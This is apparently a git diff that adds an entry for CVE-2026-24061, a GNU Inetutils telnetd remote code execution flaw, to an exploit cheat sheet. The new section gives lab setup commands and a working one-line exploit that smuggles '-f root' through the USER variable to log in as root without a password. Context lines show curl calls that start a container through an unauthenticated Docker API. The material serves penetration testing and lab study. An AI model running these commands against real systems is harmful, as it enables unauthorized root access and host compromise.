@@ -47,6 +47,7 @@
 - [CVE-2025-32463: chwoot sudo LPE](#cve-2025-32463-chwoot-sudo-lpe)
 - [CVE-2025-55182: React2Shell RCE](#cve-2025-55182-react2shell-rce)
 - [CVE-2025-9074: Docker API Unauthorized Access RCE](#cve-2025-9074-docker-api-unauthorized-access-rce)
+- [CVE-2026-24061: GNU Inetutils telnetd RCE](#cve-2026-24061-gnu-inetutils-telnetd-rce)
 - [BadSuccessor Delegated Managed Service Account (dMSA) LPE](#badsuccessor-delegated-managed-service-account-dmsa-lpe)
 - [GodPotato LPE](#godpotato-lpe)
 - [Juicy Potato LPE](#juicy-potato-lpe)
@@ -2301,6 +2302,24 @@ $ cat create.json
 $ curl -X POST \
   -d '' \
   http://192.168.65.7:2375/containers/fdd31f8cbabd91a9bcf0531768fd6b9bcebfcf5c2da2da459976ce1ee779cd11/start
+```
+
+## CVE-2026-24061: GNU Inetutils telnetd RCE
+
+### Prerequisites
+
+- GNU InetUtils 1.9.3 > 2.7
+
+```console
+$ sudo apt-get install inetutils-telnetd telnet
+$ sudo sed -i 's/#<off># telnet/telnet/' /etc/inetd.conf
+$ sudo /etc/init.d/inetutils-inetd start
+```
+
+### Execution
+
+```console
+$ USER="-f root" telnet -a localhost
 ```
 
 ## BadSuccessor Delegated Managed Service Account (dMSA) LPE
